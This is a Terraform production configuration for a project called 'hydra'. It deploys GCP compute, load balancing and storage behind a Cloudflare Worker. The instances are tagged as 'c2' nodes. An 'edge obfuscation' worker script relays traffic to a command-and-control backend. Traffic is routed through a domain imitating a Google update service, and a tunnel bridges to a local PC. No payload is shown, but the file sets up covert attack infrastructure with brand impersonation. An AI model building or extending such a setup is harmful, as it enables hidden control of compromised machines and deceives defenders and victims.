# ==============================================================================
# 0. GLOBALS & LOCALS
# ==============================================================================
locals {
  project_name = "hydra"
  environment  = "production"
}

# ==============================================================================
# 1. CORE INFRASTRUCTURE MODULES
# ==============================================================================

module "networking" {
  source       = "../../modules/gcp/networking"
  project_name = local.project_name
  environment  = local.environment
  gcp_region   = var.gcp_region
}

module "storage" {
  source       = "../../modules/gcp/storage"
  project_name = local.project_name
  environment  = local.environment
  gcp_region   = var.gcp_region
}

module "messaging" {
  source       = "../../modules/gcp/messaging"
  project_name = local.project_name
  environment  = local.environment
}

module "iam" {
  source          = "../../modules/gcp/iam"
  project_name    = local.project_name
  environment     = local.environment
  gcp_project_id  = var.gcp_project_id
  gcs_bucket_name = module.storage.bucket_name
}

module "security" {
  source       = "../../modules/gcp/security"
  project_name = local.project_name
  environment  = local.environment
  network_name = module.networking.network_name
  my_ip        = var.my_ip
}

module "kms" {
  source       = "../../modules/gcp/kms"
  project_name = local.project_name
  environment  = local.environment
  gcp_region   = var.gcp_region
}

# ==============================================================================
# 2. TRAFFIC DELIVERY (LB + Cloud CDN integrated)
# ==============================================================================

module "load_balancing" {
  source         = "../../modules/gcp/load_balancing"
  project_name   = local.project_name
  environment    = local.environment
  instance_group = module.autoscaling.instance_group
}

# ==============================================================================
# 3. COMPUTE & AUTOMATION (MIG)
# ==============================================================================

module "autoscaling" {
  source                = "../../modules/gcp/autoscaling"
  project_name          = local.project_name
  environment           = local.environment
  gcp_region            = var.gcp_region
  gcp_zone              = var.gcp_zone
  subnet_ids            = module.networking.subnet_ids
  network_tags          = [module.security.c2_node_tag]
  service_account_email = module.iam.service_account_email
  public_key            = var.public_key

  # Render the startup script using templatefile() (replaces deprecated data.template_file)
  startup_script = templatefile("${path.module}/../../../resources/templates/user_data.tftpl", {
    gcs_bucket_name = module.storage.bucket_name
    gcp_project_id  = var.gcp_project_id
  })
}

# ==============================================================================
# 4. HYBRID TUNNEL (LOCAL PC BRIDGE) — Cloudflare, unchanged
# ==============================================================================
module "cloudflare_tunnel" {
  source = "../../modules/cloudflare/dns"

  project_name          = local.project_name
  environment           = local.environment
  cloudflare_account_id = var.cloudflare_account_id
}

# ==============================================================================
# 5. EDGE OBFUSCATION (CLOUDFLARE WORKER) — Updated backend URL
# ==============================================================================
module "cloudflare_workers" {
  source = "../../modules/cloudflare/workers"

  project_name          = local.project_name
  environment           = local.environment
  cloudflare_account_id = var.cloudflare_account_id

  # Point Worker at the GCP Load Balancer IP (replaces CloudFront domain)
  c2_backend_url     = module.load_balancing.lb_ip_address
  worker_script_path = abspath("${path.module}/../../../resources/workers/ghost_proxy.js")
  local_tunnel_cname = module.cloudflare_tunnel.tunnel_cname

  # Route worker to googleupdate.uk domain
  cloudflare_zone_id = var.cloudflare_zone_id
}